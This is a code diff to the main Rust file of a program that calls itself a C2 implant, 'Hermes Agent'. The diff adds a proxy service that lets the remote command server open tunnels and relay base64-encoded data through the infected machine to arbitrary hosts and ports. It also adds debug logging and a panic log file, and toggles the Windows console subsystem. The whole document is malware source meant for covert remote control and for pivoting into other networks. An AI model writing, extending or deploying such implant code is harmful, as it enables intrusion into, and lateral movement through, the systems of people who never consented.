@@ -1,7 +1,7 @@
 //! Hermes Agent - Microkernel C2 Implant
 
 #![allow(unused_variables)]
-#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
+#![cfg_attr(target_os = "windows", windows_subsystem = "console")]
 
 pub mod kernel;
 pub mod ops;
@@ -13,7 +13,7 @@ pub mod sys;
 use kernel::Kernel;
 use ops::AgentConfig;
 use protocol::{AgentMessage, Config, ServerCommand};
-use services::{HeartbeatService, NetworkService, SessionService, TaskService};
+use services::{HeartbeatService, NetworkService, ProxyService, SessionService, TaskService};
 use std::{
     io::Write,
     sync::{mpsc, Arc, Mutex},
@@ -39,6 +39,17 @@ macro_rules! agent_log {
 }
 
 fn main() {
+    // Install panic handler that writes to debug log
+    std::panic::set_hook(Box::new(|panic_info| {
+        if let Ok(mut f) = std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open("agent_debug.log")
+        {
+            let _ = writeln!(f, "[PANIC] {}", panic_info);
+        }
+    }));
+
     let cfg = match Config::load() {
         Ok(c) => c,
         Err(_) => std::process::exit(0),
@@ -68,11 +79,12 @@ fn main() {
         outbox_tx.clone(),
     )));
     let session = Arc::new(Mutex::new(SessionService::new(op_cfg, outbox_tx.clone())));
+    let proxy = Arc::new(Mutex::new(ProxyService::new(outbox_tx.clone())));
 
     loop {
         alog!("run_once starting");
         if run_once(
-            &kernel, &cfg, &network, &heartbeat, &task, &session, &outbox_tx, &outbox_rx,
+            &kernel, &cfg, &network, &heartbeat, &task, &session, &proxy, &outbox_tx, &outbox_rx,
         )
         .is_err()
         {
@@ -91,6 +103,7 @@ fn run_once(
     heartbeat: &Arc<Mutex<HeartbeatService>>,
     task: &Arc<Mutex<TaskService>>,
     session: &Arc<Mutex<SessionService>>,
+    proxy: &Arc<Mutex<ProxyService>>,
     outbox_tx: &mpsc::Sender<AgentMessage>,
     outbox_rx: &mpsc::Receiver<AgentMessage>,
 ) -> Result<(), ()> {
@@ -131,7 +144,9 @@ fn run_once(
 
     loop {
         let heartbeat_wait = heartbeat.lock().unwrap().wait_duration();
-        let wait = if session.lock().unwrap().should_poll_fast() {
+        let wait = if session.lock().unwrap().should_poll_fast()
+            || proxy.lock().unwrap().should_poll_fast()
+        {
             heartbeat_wait.min(Duration::from_millis(100))
         } else {
             heartbeat_wait
@@ -144,13 +159,17 @@ fn run_once(
 
         match line {
             Ok(Some(line)) => {
+                alog!("read_line got: {}", &line[..line.len().min(200)]);
                 let cmd: ServerCommand = match serde_json::from_str(&line) {
                     Ok(c) => c,
                     Err(_) => continue,
                 };
 
                 match cmd {
-                    ServerCommand::Disconnect { .. } => return Ok(()),
+                    ServerCommand::Disconnect { .. } => {
+                        alog!("got Disconnect, returning Ok");
+                        return Ok(());
+                    }
                     ServerCommand::DispatchTask {
                         task_id,
                         command,
@@ -191,7 +210,45 @@ fn run_once(
                             jitter,
                         });
                     }
-                    _ => {}
+                    ServerCommand::OpenProxy {
+                        proxy_id,
+                        bind_addr,
+                    } => {
+                        proxy.lock().unwrap().open(&proxy_id, &bind_addr);
+                    }
+                    ServerCommand::ProxyConnect {
+                        proxy_id,
+                        stream_id,
+                        host,
+                        port,
+                    } => {
+                        proxy
+                            .lock()
+                            .unwrap()
+                            .connect(&proxy_id, &stream_id, &host, port);
+                    }
+                    ServerCommand::ProxyData {
+                        proxy_id,
+                        stream_id,
+                        data_base64,
+                    } => {
+                        proxy
+                            .lock()
+                            .unwrap()
+                            .data(&proxy_id, &stream_id, &data_base64);
+                    }
+                    ServerCommand::ProxyClose {
+                        proxy_id,
+                        stream_id,
+                    } => {
+                        proxy.lock().unwrap().close_stream(&proxy_id, &stream_id);
+                    }
+                    ServerCommand::CloseProxy { proxy_id } => {
+                        proxy.lock().unwrap().close_proxy(&proxy_id);
+                    }
+                    _ => {
+                        alog!("unhandled ServerCommand: {}", line);
+                    }
                 }
 
                 flush_outbox(network, outbox_rx, None)?;
@@ -201,14 +258,18 @@ fn run_once(
                 return Ok(());
             }
             Err(_) => {
-                let poll_fast = session.lock().unwrap().should_poll_fast();
+                let poll_fast = session.lock().unwrap().should_poll_fast()
+                    || proxy.lock().unwrap().should_poll_fast();
                 let hb_due = heartbeat.lock().unwrap().should_send();
                 alog!("read timeout: poll_fast={} hb_due={}", poll_fast, hb_due);
-                if session.lock().unwrap().should_poll_fast() {
+                if poll_fast {
                     flush_outbox(network, outbox_rx, None)?;
+                    alog!("after cmd/proxy flush_outbox OK, looping");
                     session.lock().unwrap().clear_flush_hint();
+                    proxy.lock().unwrap().clear_flush_hint();
                 }
                 if heartbeat.lock().unwrap().should_send() {
+                    alog!("sending heartbeat");
                     flush_outbox(
                         network,
                         outbox_rx,
